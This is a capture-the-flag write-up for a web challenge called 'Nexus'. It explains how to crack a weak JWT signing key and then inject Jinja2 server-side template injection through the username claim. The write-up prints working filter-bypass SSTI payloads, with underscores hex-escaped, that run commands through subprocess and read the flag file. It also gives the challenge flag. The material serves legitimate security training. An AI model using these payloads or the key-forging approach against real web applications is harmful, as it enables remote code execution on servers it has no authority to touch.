<font size='10'>Nexus</font>

16<sup>th</sup> May 2024

Prepared By: `Muhammad Saad Akhtar`

Challenge Author(s): `Muhammad Saad Akhtar`

Category: `Web`

Difficulty: <font color='yellow'>Not too easy</font>

<br><br>

## Credits

I made this challenge after playing [this](https://github.com/UofTCTF/uoftctf-2024-chals-public/tree/master/Web/No%20Code) and tweaking a bit of functionality and UI. Also I made it a bit easier by removing some important filters so original idea and credit goes to this challenge's author. 

## Description

- In this challenge, the participants need to analyze the functionality of the web app. They first need to exploit the JWT weak signing key to inject `SSTI` in the JWT cookie. Finally, they need to bypass some basic `SSTI` filtering to get code execution on the server.

## Skills Required

- Information Gathering
- Researching Skills
- A little bit of python know how (otherwise you'll get it with googling)

# Solution

The participants are provided with a URL to access the application.

Upon visiting the URL, we can see a login page.

![img](assets/0.png)

Since we don't have any creds, let's sign up and then login.

![img](assets/1.png)

We just get a dashboard and that's it. Nothing out of ordinary, we just have a jwt cookie after login and that's it.

Looking at the JWT token in [jwt.io](https://jwt.io).

![img](assets/2.png)

In the payload, it has our username. And the same username is also displayed on the dashboard above.

We might have some sort of injection here but we can't just modify the payload of jwt. We need the signing key first.

For this, we can try brute-forcing JWT signing key. If it is a weak one, we'll get it right.

We can use `john` for cracking and `rockyou.txt` or `jwt.secrets` wordlist to brute-force the signing key.

```bash
┌──(kali㉿kali)-[~/…/unused/nexus/writeup/test]
└─$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNhYWQifQ.DHCqZk9wK2pKvO-ymWuVz0qhhdHzrn2s_PG-bHTZ32Q' > jwt.hash
```

![img](assets/3.png)

We got the key `changethis`.

Now we can use this key to manipulate the username and try different injection attacks.

Trying out `SSTI`, we can do with a payload like `{{7*7}}`.

![img](assets/4.png)

Then we try visiting `/dashboard` with this token.

![img](assets/5.png)

And we got `49` indicating, we got `SSTI`.

Now from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2), we can try a simple `SSTI` payload for RCE.

First let's try this one: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

Testing this payload, we get a blocked message.

![img](assets/6.png)

This indicates that there's some sort of filtering being done on the backend for `SSTI`.

We can try different payloads and as a result, it would return us with the blacklisted characters.

With trial and error, the final working payload would be as follows.

```python
{{self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('subprocess')|attr('run')('id', shell=True)}}
```

In this payload, we're using `\x5f` in replacement of `_`. 

There are more ways to solve this as well but this one would work just fine.

Above payload runs `id` command using `subprocess` module. It won't show the output but we can get a success message that our command ran successfully.

Inject the payload in JWT and notice, we need to escape backslashes to fit in the payload.
![img](assets/7.png)

![img](assets/8.png)

We can also confirm this with `curl` or `wget` as it is somewhat blind.

We can try crafting a reverse shell with our available whitelisted characters or since the goal of this challenge is to read the flag, I'll do it with `subprocess.getoutput()`

```python
{{self|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('subprocess')|attr('getoutput')('cat /*.txt')}}
```

Using `/*.txt` as the word `flag` is also blacklisted.

![img](assets/9.png)


### Challenge Flag

flag{im_n3ver_7rusting_f1rewalls_4gain!}